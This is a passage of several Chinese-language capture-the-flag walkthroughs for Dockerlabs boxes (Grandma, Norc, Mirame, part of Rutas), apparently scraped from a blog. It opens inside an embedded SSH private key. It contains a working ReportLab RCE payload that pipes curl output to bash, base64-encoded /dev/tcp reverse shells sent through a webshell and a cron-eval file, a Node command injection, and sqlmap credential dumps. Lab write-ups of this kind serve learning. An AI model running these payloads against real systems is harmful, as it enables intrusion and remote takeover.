F1OHeFj6hbVekh\r3NwNH4urGYiyDUCHhV0Cml7lLVERbPzHVLS9xWISbhxU2XLe1r+REdFzUwizeUkBT8MZ+d\rpGsSmfsfOu3WfPZaR00bTafZDq2rg4E0/VogwfKmsnLVWciWBSoeesBTdUv4RfRrqYDevq\rXRcMUZLT+QRm7yCt+oBixcHEy5yv74ELqrIL84qGCEKXPqa4M0u+eXqjIzWvkKZc4pkBCm\rJsaTjCTs33LJGQDx7YJRFplHsFxOAoxmxZvLpMbVg9mNaLvAY24NyQNbRFL6as5VM15aJ3\r+xZQO87BBjOxWh0ypNBA8WJV51JJXO1B7fIcf8DXdpE7sVP1vcomyRDD3jc7MpVqk8aM6u\rbIZAOWAoPFkh8XaSMofcFXH3w6lyRXIABwPUN9QWfc3AEojrMwXdkxvKHW9ZM5WfoGOVlq\rOwbDGWl4DvwjNwb8ulf1zaX3G9uJfwAAAAMBAAEAAAGABIavf+Rsq01eFXxOeWWOeY8yN4\rEacZp1Ujsv9bMl8ix1/7nxQNPgw4XRn31TOK/doe+NQqpTWB2VNII5QYwXiqnn8AJsFfSH\rPRzFpeLgME6xVGfuJmcWt7vMrjjI+w1ZD++9k4pFtt6J4xaFFhNQLAWrx6ACtpNZepSzGY\rCwFGooKZ53oZJNPFsh3/sQbS8Uv9AiSGBmSFglTMHd2QF+CfuNVDLE0QVdXuQrrsYr1zHs\r4UZnxwPaZ4xZfAcWBWFXOY2Vv8FXm5dl+p/M2gSVvr5naczE3UvDb/PR2FHjajJxv9EuyD\rcfNY/V2aYiSvCgRRD6tD28CpR+mNRHI9hYcRvNUBob+xrIHhgEo5q5nZ74UwSG7ThUdvj9\rWetfXPEFN2HFMTTL6HO1sGfY+RjFDf5M0DXNOvutoCu7cRQRdhu8pTbkrMXOvpgPfNDMil\rzeMXaaXHgwn8qrtxmraPRPChNNVlr+oVC86DLeLCp/QbbFW67lU9etgy7iGj5GDl5xAAAA\rwQCSDLUIQh998mUqqI1d50UjwNDaUaURTH5CzA2kI30E7aPo1ptGVEZv+BrhW0MseszBOm\rw190PPu4tu7tSuWEi65W6jQ3rP3arBYg5NJY9CeqFdcbjM0+prd2w4lVW2tgmNRJV4YbMI\rM4DXJEk3cmkpSPQn+kxwDIykF4JF1OXOkqonl8cWx5kjnFt4KDTmUCGrosmTbq8vlrOT/h\rI0iqud99bVDq1bs2G5TWGit2KLS1wLySPUSBkp9fD1P4+jj7gAAADBAOe+2HazhSfiew1l\r45PaCpfj0UCwcKTA1pGTZ23ZMZEVAf+IY75hUFoFX0eiiwCfC/CEUEosoX5IB3kCOrP9zS\r3rl80QQyni5odO9FCfUrRsxQF0m0mRsXtsZeVSSCwpDJiQwOwTiGAq/jL95LKbhulkriMJ\rMt9dkTC7toDUHCKeHKgYHOQtHBaQXEJUDPhbfEoBBRmKupJOK6y/2ThO6GatSIVVfTxQ71\rfDw58e/erbHtiEvW3X5V71m2PN5HC+dwAAAMEAuDCEHRUs437tXr2ejwxujdpLceirzHw6\rdqOZyZeentgpcPgUMjqzXWSjpvwNP9jxdcmfN8/lU2lYVrJMNITA5ehHq8LoyLuzC8VwpW\rHJfy4ekNINL4ioz5ebfVw8baECKSoQpJyLSYRVkgEQQy+MxG9nggp9otf08y3Qty2Iqv9O\rW8KLOApH1hRq0dqWPv4U0jrJLLZqiZODuUDQOwto+DMdM9UK44BNLm+WMd6dQ1JjDP1yuo\rc1jN/HCLC6ayc5AAAAFWRyenVuZGVyQDhkMmU1OWQzMmJkZQECAwQF\r-----END OPENSSH PRIVATE KEY----- æ‹¿ä¸‹ç¬¬ä¸€å°ä¸»æœºæƒé™\nChisel Proxy #\rjpillora/chisel: A fast TCP/UDP tunnel over HTTP è¿™é‡Œä½¿ç”¨chiselæ¥æ­å»ºä»£ç†ï¼Œæ›´æ–¹ä¾¿ä¸€äº›\nå¯åŠ¨ä»£ç†æˆåŠŸå¦‚å›¾\nNmap 20.20.20.3 #\r[root@kali] /home/kali/grandma â¯ proxychains nmap 20.20.20.3 -Pn -sT -p- å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†2222å’Œ9000ç«¯å£\nè¿›å…¥9000ç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢\nBurp Settings #\rè¿™é‡Œéœ€è¦ä½¿ç”¨åˆ°ä¸€ä¸ªæ’ä»¶ï¼šFoxyProxyï¼Œå…·ä½“è®¾ç½®å¦‚ä¸‹\nè®¿é—®http://20.20.20.3:9000/éœ€è¦è°ƒåˆ°grandma2ï¼ŒæŠ“åŒ…éœ€è¦è°ƒåˆ°burpsuite\nåœ¨burpsuiteé‡Œéœ€è¦è®¾ç½®ä¸€ä¸‹ç½‘ç»œè¿æ¥\nå‘åŒ…åå¯ä»¥çœ‹åˆ°ä¸€ä¸ªç½‘ç«™ï¼šhttp://www.reportlab.com\nCVE-2023-33733 #\ræœç´¢æŸ¥æ‰¾åˆ°ä¸€ä¸ªCVEæ¼æ´\nc53elyas/CVE-2023-33733: CVE-2023-33733 reportlab RCE å¾—åˆ°æ”»å‡»è½½è·\n\u0026lt;para\u0026gt;\u0026lt;font color=\u0026#34;[[[getattr(pow, Word(\u0026#39;__globals__\u0026#39;))[\u0026#39;os\u0026#39;].system(\u0026#39;touch /tmp/exploited\u0026#39;) for Word in [ orgTypeFun( \u0026#39;Word\u0026#39;, (str,), { \u0026#39;mutated\u0026#39;: 1, \u0026#39;startswith\u0026#39;: lambda self, x: 1 == 0, \u0026#39;__eq__\u0026#39;: lambda self, x: self.mutate() and self.mutated \u0026lt; 0 and str(self) == x, \u0026#39;mutate\u0026#39;: lambda self: { setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1) }, \u0026#39;__hash__\u0026#39;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and \u0026#39;red\u0026#39;\u0026#34;\u0026gt;\rexploit\r\u0026lt;/font\u0026gt;\u0026lt;/para\u0026gt; éœ€è¦ä½¿ç”¨socatè¿›è¡Œæµé‡è½¬å‘ä¸€ä¸‹ï¼Œæˆ‘æ˜¯ç›´æ¥æŠŠkalié‡Œé¢çš„socatä¼ ä¸Šå»çš„\ndrzunder@e825ec493085:/tmp$ ./socat tcp-l:4444,fork,reuseaddr tcp:10.10.10.1:4444 æ”»å‡»è½½è·åº”è¯¥ä¿®æ”¹ä¸ºè¿™æ ·\n\u0026lt;para\u0026gt;\r\u0026lt;font color=\u0026#34;[ [ getattr(pow,Attacker(\u0026#39;__globals__\u0026#39;))[\u0026#39;os\u0026#39;].system(\u0026#39;curl http://20.20.20.2:8000/shell.sh | bash\u0026#39;) for Attacker in [orgTypeFun(\u0026#39;\rAttacker\u0026#39;, (str,), { \u0026#39;mutated\u0026#39;: 1, \u0026#39;startswith\u0026#39;: lambda self, x: False, \u0026#39;__eq__\u0026#39;: lambda self,x: self.mutate() and self.mutated \u0026lt; 0 and str(self) == x, \u0026#39;mutate\u0026#39;: lambda self:\r{setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1)}, \u0026#39;__hash__\u0026#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and \u0026#39;red\u0026#39;\u0026#34;\u0026gt;\rexploit\r\u0026lt;/font\u0026gt;\r\u0026lt;/para\u0026gt; åœ¨drzunderä¸Šé¢å‡†å¤‡ä¸€ä¸ªåå¼¹shellçš„è„šæœ¬ï¼Œå¹¶ä¸”å¼€å¯httpserveræœåŠ¡\nå¾—åˆ°äº†appç”¨æˆ·çš„sshå¯†é’¥\nè¯¥æœºå™¨ä¸Šå¹¶æ²¡æœ‰å¼€å¯22ç«¯å£ï¼Œéœ€è¦æ‰‹åŠ¨æŒ‡å®šä¸º2222\nProxy Bridge #\rå¦‚å›¾æ­å»ºä»£ç†\nä¸­é—´éœ€è¦drzunderä½œä¸ºæµé‡è½¬å‘ç‚¹\nNmap 30.30.30.3 #\rNmap scan report for 30.30.30.3\rHost is up (0.14s latency).\rNot shown: 998 closed tcp ports (conn-refused)\rPORT STATE SERVICE\r2222/tcp open EtherNetIP-1\r3000/tcp open ppp è®¿é—®3000ç«¯å£è¿”å›ç©ºç™½\næŠ“åŒ…å‘ç°å­˜åœ¨ä¸€ä¸ªç‰¹æ®Šå­—æ®µ\nå°†å…¶è§£ç ä¸€ä¸‹\nYzMxZWNiMjItOTZiNS00MDNjLTkzMDMtMDU1ZTlmYTlhZGRi\rc31ecb22-96b5-403c-9303-055e9fa9addb å°†**/etc/passwdè¿›è¡ŒBASE64åŠ å¯†åæ›¿æ¢ï¼ŒæˆåŠŸè¯»å–åˆ°æ–‡ä»¶ï¼Œå¹¶ä¸”å­˜åœ¨node**ç”¨æˆ·\næˆåŠŸè¯»å–åˆ°nodeçš„å¯†é’¥\nåŒæ ·çš„æ–¹å¼æ­å»ºä»£ç†æ¡¥ï¼Œè®©appä¹Ÿä½œä¸ºèŠ‚ç‚¹ï¼Œè¿™é‡Œä¸å†é‡å¤ã€‚\nNmap 40.40.40.3 #\r[root@kali] /home/kali/grandma â¯ proxychains nmap 40.40.40.3 -Pn -sT 2\u0026gt;/dev/null â\rNmap scan report for 40.40.40.3\rHost is up (0.13s latency).\rNot shown: 999 closed tcp ports (conn-refused)\rPORT STATE SERVICE\r9999/tcp open abyss å¯ä»¥çœ‹åˆ°åªè®©POST\n[root@kali] /home/kali â¯ proxychains curl -X POST \u0026#34;http://40.40.40.3:9999/\u0026#34; [proxychains] config file found: /etc/proxychains4.conf\r[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\r[proxychains] DLL init: proxychains-ng 4.17\r[proxychains] Dynamic chain ... 127.0.0.1:1080 ... 40.40.40.3:9999 ... OK\r{\u0026#34;message\u0026#34;:\u0026#34;POST request received\u0026#34;,\u0026#34;users\u0026#34;:[{\u0026#34;id\u0026#34;:1,\u0026#34;name\u0026#34;:\u0026#34;DrZunder\u0026#34;},{\u0026#34;id\u0026#34;:2,\u0026#34;name\u0026#34;:\u0026#34;DrMario\u0026#34;},{\u0026#34;id\u0026#34;:3,\u0026#34;name\u0026#34;:\u0026#34;App\u0026#34;},{\u0026#34;id\u0026#34;:4,\u0026#34;name\u0026#34;:\u0026#34;Node\u0026#34;},{\u0026#34;id\u0026#34;:\u0026#34;Error\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Command error\u0026#34;}]}# è¿™ä¸ªé”™è¯¯æ¶ˆæ¯ä¼¼ä¹è¯´æ˜äº†ï¼Œè¯¥ç½‘ç«™å¯¹Jsonå†…å®¹çš„è§£ææœ‰é—®é¢˜\nå°è¯•å‘é€ä¿®æ”¹åçš„idå­—æ®µï¼Œçœ‹åˆ°å‘½ä»¤æ‰§è¡Œçš„ç»“æœ\n[root@kali] /home/kali â¯ proxychains curl -s -X POST \u0026#34;http://40.40.40.3:9999\u0026#34; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;id\u0026#34;: \u0026#34;require(\\\u0026#34;child_process\\\u0026#34;).execSync(\\\u0026#34;id\\\u0026#34;).toString()\u0026#34;}\u0026#39;\r[proxychains] config file found: /etc/proxychains4.conf\r[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\r[proxychains] DLL init: proxychains-ng 4.17\r[proxychains] Dynamic chain ... 127.0.0.1:1080 ... 40.40.40.3:9999 ... OK\r{\u0026#34;message\u0026#34;:\u0026#34;POST request received\u0026#34;,\u0026#34;users\u0026#34;:[{\u0026#34;id\u0026#34;:1,\u0026#34;name\u0026#34;:\u0026#34;DrZunder\u0026#34;},{\u0026#34;id\u0026#34;:2,\u0026#34;name\u0026#34;:\u0026#34;DrMario\u0026#34;},{\u0026#34;id\u0026#34;:3,\u0026#34;name\u0026#34;:\u0026#34;App\u0026#34;},{\u0026#34;id\u0026#34;:4,\u0026#34;name\u0026#34;:\u0026#34;Node\u0026#34;},{\u0026#34;id\u0026#34;:\u0026#34;Error\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Command error\u0026#34;}],\u0026#34;result\u0026#34;:\u0026#34;uid=0(root) gid=0(root) groups=0(root)\\n\u0026#34;}# å¹¶ä¸”å½“å‰ç”¨æˆ·çš„rootæƒé™\nç›´æ¥åå¼¹shellå°±è¡Œäº†\nReverseShellBridges #\råå¼¹Shellçš„å…¨éƒ¨ä»£ç†\nå¯ä»¥çœ‹åˆ°socatè¿›è¡Œæµé‡è½¬å‘ï¼Œæœ€åæŠŠ40.40.40.3çš„æµé‡å¸¦åˆ°äº†10.10.10.1\nHttpBridges #\rä¸‹é¢æ˜¯ç«¯å£è½¬å‘çš„å…¨éƒ¨ä»£ç†ï¼Œä¹Ÿå°±æ˜¯è®¿é—®httpé¡µé¢çš„ä»£ç†\nSummary #\rç»ˆäºåˆ°äº†Summaryé˜¶æ®µï¼Œå¤´éƒ½è¦ç‚¸äº†ï¼Œç”±äºä¸æ˜¯å•ç‹¬çš„UserRootï¼Œè¿™é‡Œå°±éšä¾¿è¯´ä¸€ç‚¹ã€‚\nè¿™ä¸ªé¶æœºä¸­æœ‰å››ä¸ªä¸»æœºï¼Œéœ€è¦é€ä¸ªæ­å»ºä»£ç†ã€‚\nåœ¨æœ¬æ–‡ä¸­ä½¿ç”¨åˆ°äº†chiselä½œä¸ºä»£ç†å·¥å…·ï¼Œä¸»è¦æ˜¯å› ä¸ºä¸éœ€è¦å¤ªå¤šé…ç½®ï¼Œfrpçš„é…ç½®æ–‡ä»¶å°±æ¯”è¾ƒç¹çã€‚\nsocatè¿™ä¸ªå·¥å…·ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡åœ¨å¤šå±‚è½¬å‘çš„åœºæ™¯ä¸‹ä½¿ç”¨ï¼Œæ„Ÿè§‰åˆå­¦åˆ°äº†æ–°ä¸œè¥¿ã€‚\nå¯¹å†…ç½‘æ¸—é€æœ‰äº†æ›´åŠ æ·±åˆ»çš„ç†è§£ï¼\n","date":"2025-02-24","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-grandma/","section":"Posts","summary":"","title":"Dockerlabs-Grandma","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali â¯ nmap 172.17.0.2 -sV -A Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 21:13 CST\rNmap scan report for 172.17.0.2\rHost is up (0.00011s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\r| ssh-hostkey: | 256 8c:5c:7b:fe:79:92:7a:f9:85:ec:a5:b9:27:25:db:85 (ECDSA)\r|_ 256 ba:69:95:e3:df:7e:42:ec:69:ed:74:9e:6b:f6:9a:06 (ED25519)\r80/tcp open http Apache httpd 2.4.59 ((Debian))\r|_http-title: Did not follow redirect to http://norc.labs/?password-protected=login\u0026amp;redirect_to=http%3A%2F%2F172.17.0.2%2F\r|_http-server-header: Apache/2.4.59 (Debian)\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.11 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 15.22 seconds å°†norc.labsæ·»åŠ åˆ°**/etc/hosts**\nåœ¨æŠ“åŒ…çš„æ—¶å€™å‘ç°ä¼¼ä¹å­˜åœ¨wordpressæœåŠ¡ï¼Œå¯ä»¥çœ‹åˆ°Cookieçš„æ ·å¼\nè®¿é—®**/wp-admin**çš„æ—¶å€™è‡ªåŠ¨å°±è·³è½¬åˆ°äº†ç™»å½•é¡µé¢\nä½¿ç”¨WPscanå¹¶æ²¡æœ‰ä»»ä½•æ•ˆæœ\nFFUF #\r[root@kali] /home/kali/Desktop â¯ ffuf -u \u0026#34;http://norc.labs/FUZZ\u0026#34; -w ./Wordpress-BruteForce-List/WPfuzz.txt -mc 200 -o result.txt ç„¶åæŸ¥çœ‹æ˜¯å¦ä½¿ç”¨äº†æ’ä»¶\n[root@kali] /home/kali/Desktop â¯ cat result.txt | jq | grep -n \u0026#34;plugin\u0026#34;\r1196: \u0026#34;FUZZ\u0026#34;: \u0026#34;wp-admin/includes/plugin-install.php\u0026#34;\r1208: \u0026#34;url\u0026#34;: \u0026#34;http://norc.labs/wp-admin/includes/plugin-install.php\u0026#34;,\r1232: \u0026#34;FUZZ\u0026#34;: \u0026#34;wp-admin/includes/plugin.php\u0026#34;\r1244: \u0026#34;url\u0026#34;: \u0026#34;http://norc.labs/wp-admin/includes/plugin.php\u0026#34;,\r1664: \u0026#34;FUZZ\u0026#34;: \u0026#34;wp-admin/js/plugin-install.js\u0026#34;\r1676: \u0026#34;url\u0026#34;: \u0026#34;http://norc.labs/wp-admin/js/plugin-install.js\u0026#34;,\r3266: \u0026#34;FUZZ\u0026#34;: \u0026#34;/wp-content/plugins/wp-fastest-cache/readme.txt\u0026#34;\r3278: \u0026#34;url\u0026#34;: \u0026#34;http://norc.labs//wp-content/plugins/wp-fastest-cache/readme.txt\u0026#34;, CVE-2023-6063 #\rå…³æ³¨åˆ°wp-fastest-cacheçš„ç‰ˆæœ¬å·æ˜¯1.2.1\næœç´¢åˆ°äº†ä¸€ä¸ªSQLæ³¨å…¥çš„æ¼æ´\nmotikan2010/CVE-2023-6063-PoC: CVE-2023-6063 (WP Fastest Cache \u0026lt; 1.2.2 - UnAuth SQL Injection) [root@kali] /home/kali/Desktop â¯ sqlmap --dbms=mysql -u \u0026#34;http://norc.labs/wp-login.php\u0026#34; --cookie=\u0026#39;wordpress_logged_in=*\u0026#39; --level=2 --schema å¯ä»¥çœ‹åˆ°å­˜åœ¨æ—¶é—´ç›²æ³¨æ¼æ´\n[root@kali] /home/kali/Desktop â¯ sqlmap --dbms=mysql -u \u0026#34;http://norc.labs/wp-login.php\u0026#34; --cookie=\u0026#39;wordpress_logged_in=*\u0026#39; --level=3 -D wordpress -T wp_users -C user_login,user_pass,user_email --dump ä½†æ˜¯æ— æ³•è¿›è¡Œç ´è§£ï¼Œä¸è¿‡å¾—åˆ°ä¸€ä¸ªå­åŸŸåoledockersï¼Œè¿›å…¥åå¾—åˆ°äº†å¯†ç \nwww-data #\ré‡‡ç”¨Dockerlabs-WalkingCMS - HYHé‡Œçš„æ–¹å¼åˆ¶ä½œæ’ä»¶\nå®‰è£…åè®¿é—®ï¼ŒPOSTä¼ å‚æ‰§è¡Œå‘½ä»¤\nhttp://norc.labs/wp-content/plugins/health-check/webshell.php\r#POST\rcmd=echo%20%22YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS8xMDAgMD4mMQ==%22%7Cbase64%20-d%7Cbash User #\råœ¨kvzlxçš„ç›®å½•ä¸­å‘ç°ä¸€ä¸ªè„šæœ¬ï¼Œä½†æ˜¯å…¶ä¸­çš„**.wp-encrypted.txtå¹¶æ²¡æœ‰åœ¨ç›®å½•ä¸­å‘ç°ï¼Œ/tmp/decoded.txt**ä¹Ÿæ˜¯ç©ºçš„\nwww-data@955ef139e3e6:/home/kvzlx$ ls -al\rls -al\rtotal 24\rdrwxr-xr-x 1 kvzlx kvzlx 4096 Jul 1 2024 .\rdrwxr-xr-x 1 root root 4096 Jul 1 2024 ..\r-rw-r--r-- 1 kvzlx kvzlx 220 Apr 23 2023 .bash_logout\r-rw-r--r-- 1 kvzlx kvzlx 3526 Apr 23 2023 .bashrc\r-rwxr--r-- 1 kvzlx kvzlx 164 Jun 9 2024 .cron_script.sh\r-rw-r--r-- 1 kvzlx kvzlx 807 Apr 23 2023 .profile\rwww-data@955ef139e3e6:/home/kvzlx$ cat .cron*\rcat .cron*\r#!/bin/bash\rENC_PASS=$(cat /var/www/html/.wp-encrypted.txt)\rDECODED_PASS=$(echo $ENC_PASS | base64 -d)\recho $DECODED_PASS \u0026gt; /tmp/decoded.txt\reval \u0026#34;$DECODED_PASS\u0026#34; ä¸Šä¼ ä¸€ä¸‹pspyè·Ÿè¸ªè¿›ç¨‹\nDominicBreuker/pspy: Monitor linux processes without root permissions å¯ä»¥å‘ç°UIDä¸º1000çš„ç”¨æˆ·åœ¨è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œä¹Ÿå°±æ˜¯kvzlxæœ¬äºº\nwww-data@955ef139e3e6:/var/www$ getent passwd 1000\rgetent passwd 1000\rkvzlx:x:1000:1000::/home/kvzlx:/bin/bash å› æ­¤å¯ä»¥å†™å…¥è¿›è¡Œ**.wp-encrypted.txtææƒï¼Œå› ä¸º.cron_script.sh**æ— æ³•å†™å…¥\nwww-data@955ef139e3e6:/var/www/html$ echo \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzIwMCAwPiYx\u0026#34; \u0026gt;\u0026gt; .wp-encrypted.txt ç›‘å¬å¾—åˆ°kvzlxçš„åå¼¹shell\nRoot #\råœ¨linpeasè¾“å‡ºä¸­å‘ç°ï¼Œ/opt/python3å¯ä»¥ä¿®æ”¹uid\næŸ¥æ‰¾GTFOBinsğŸ‘‡\npython | GTFOBins Summary #\rUserï¼šæ‰«æå¾—åˆ°wordpressç¼“å­˜æ’ä»¶å­˜åœ¨SQLæ—¶é—´ç›²æ³¨æ¼æ´ï¼Œå¾—åˆ°å­åŸŸååæ‹¿åˆ°å¯†ç ï¼Œç™»å½•åå°ä»è€Œå†™å…¥æœ¨é©¬åå¼¹Shellã€‚è¿™é‡Œå¯ä»¥ä¸Šä¼ pspyæ¥è¿½è¸ªè¿›ç¨‹å‘ç°å­˜åœ¨ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡ï¼Œæ ¹æ®è„šæœ¬å†™å…¥åå¼¹è¯­å¥ã€‚\nRootï¼špythonå¯ä»¥è®¾ç½®å½“å‰ç”¨æˆ·çš„uidï¼Œå¯ä»¥è®¾ç½®ä¸ºrootæƒé™å¯åŠ¨**/bin/sh**ã€‚\n","date":"2025-02-24","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-norc/","section":"Posts","summary":"","title":"Dockerlabs-Norc","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Desktop â¯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 10:42 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000085s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\r| ssh-hostkey: | 256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)\r|_ 256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)\r80/tcp open http Apache httpd 2.4.61 ((Debian))\r|_http-title: Login Page\r|_http-server-header: Apache/2.4.61 (Debian)\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 9.98 seconds è¿›å…¥ç½‘é¡µæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œå°è¯•ä½¿ç”¨å¸¸è§çš„é»˜è®¤è´¦æˆ·ç™»é™†å¤±è´¥ã€‚\nSQL Injection #\rä½¿ç”¨SQLæ³¨å…¥å‘ç°å›æ˜¾äº†é”™è¯¯ä¿¡æ¯\nä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥\n[root@kali] /home/kali/Desktop â¯ sqlmap -u \u0026#34;http://172.17.0.2/auth.php\u0026#34; --data \u0026#34;username=root\u0026amp;password=root\u0026#34; -p password -vvv Database: users\rTable: usuarios\r[4 entries]\r+----+------------------------+------------+\r| id | password | username |\r+----+------------------------+------------+\r| 1 | chocolateadministrador | admin |\r| 2 | lucas | lucas |\r| 3 | soyagustin123 | agustin |\r| 4 | directoriotravieso | directorio |\r+----+------------------------+------------+ å¯ä»¥ä½¿ç”¨adminçš„è´¦æˆ·ç™»å½•è¿›å»ï¼Œä½†æ˜¯å¥½åƒå¯¼å‘çš„å°±æ˜¯page.phpï¼Œè€Œpage.phpä¸éœ€è¦èº«ä»½éªŒè¯å°±å¯ä»¥è¿›å»\nè€Œè¿™ä¸ªæŸ¥è¯¢æ¸©åº¦çš„é¡µé¢ä¼¼ä¹ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç”¨ã€‚\nå°è¯•è®¿é—®**172.17.0.2/directoriotravieso/**å‘ç°ä¸€ä¸ªå›¾ç‰‡å¯ä»¥ä¸‹è½½\nZip Crack #\rå°è¯•ä½¿ç”¨steghideè¿›è¡Œæå–ï¼Œä¸è¿‡çœ‹èµ·æ¥éœ€è¦å¯†ç \nä½¿ç”¨stegcrackerè¿›è¡Œå¯†ç çˆ†ç ´\n[root@kali] /home/kali/Mirame â¯ stegcracker miramebien.jpg /usr/share/wordlists/rockyou.txt â\rStegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)\rCopyright (c) 2025 - Luke Paris (Paradoxis)\rStegCracker has been retired following the release of StegSeek, which will blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.\rStegSeek can be found at: https://github.com/RickdeJager/stegseek\rCounting lines in wordlist..\rAttacking file \u0026#39;miramebien.jpg\u0026#39; with wordlist \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;..\rSuccessfully cracked file with password: chocolate\rTried 27 passwords\rYour file has been written to: miramebien.jpg.out\rchocolate å¾—åˆ°å¯†ç åå†åˆ†ç¦»æ–‡ä»¶ï¼Œå‘ç°è¿˜è¦å¯†ç ã€‚\nå†çˆ†ç ´å‹ç¼©åŒ…æ–‡ä»¶\n[root@kali] /home/kali/Mirame â¯ zip2john ocultito.zip \u0026gt;\u0026gt; zip.hash [root@kali] /home/kali/Mirame â¯ john zip.hash /usr/share/wordlists/rockyou.txt å¾—åˆ°å¯†ç ä¸ºï¼šstupid1\n[root@kali] /home/kali/Mirame â¯ cat secret.txt carlos:carlitos è¿›è¡Œsshç™»å½•æˆåŠŸ\nRoot #\rä¸Šä¼ linpeasæŸ¥çœ‹è¯¦ç»†ï¼Œå‘ç°findå‘½ä»¤æœ‰ç‰¹æ®Šæƒé™\næŸ¥çœ‹GTFObins\nfind | GTFOBins éå¸¸ç®€å•\nSummary #\rUserï¼šé€šè¿‡sqlæ³¨å…¥æ³„éœ²å‡ºäº†ç”¨æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘æ²¡æƒ³åˆ°çš„æ˜¯å±…ç„¶æ˜¯ä½œä¸ºç›®å½•è®¿é—®ã€‚ç„¶åè·å–åˆ°å›¾ç‰‡è¿›è¡Œåˆ†ç¦»ï¼Œå¯èƒ½æ¶‰åŠåˆ°ä¸€ç‚¹Miscçš„å†…å®¹ã€‚ç„¶åçˆ†ç ´å‹ç¼©åŒ…ï¼Œå¾—åˆ°å¯†ç è¿›è¡Œsshç™»å½•ã€‚\nRootï¼šç»å…¸çš„findææƒä¸å¤šè¯´äº†ã€‚\n","date":"2025-02-22","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-mirame/","section":"Posts","summary":"","title":"Dockerlabs-Mirame","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Rutas â¯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 19:23 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000066s latency).\rNot shown: 997 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.5\r| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r| -rw-r--r-- 1 0 0 0 Jul 11 2024 hola_disfruta\r|_-rw-r--r-- 1 0 0 293 Jul 11 2024 respeta.zip\r| ftp-syst: | STAT: | FTP server status:\r| Connected to ::ffff:172.17.0.1\r| Logged in as ftp\r| TYPE: ASCII\r| No session bandwidth limit\r| Session timeout in seconds is 300\r| Control connection is plain text\r| Data connections will be plain text\r| At session startup, client count was 4\r| vsFTPd 3.0.5 - secure, fast, stable\r|_End of status\r22/tcp open ssh OpenSSH 7.7p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 63:16:54:2a:05:1d:8e:43:53:55:8b:d5:4e:35:c9:1f (ECDSA)\r|_ 256 21:24:77:5d:f8:2f:b2:64:ec:42:8b:0b:ef:f0:46:1b (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.58 (Ubuntu)\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 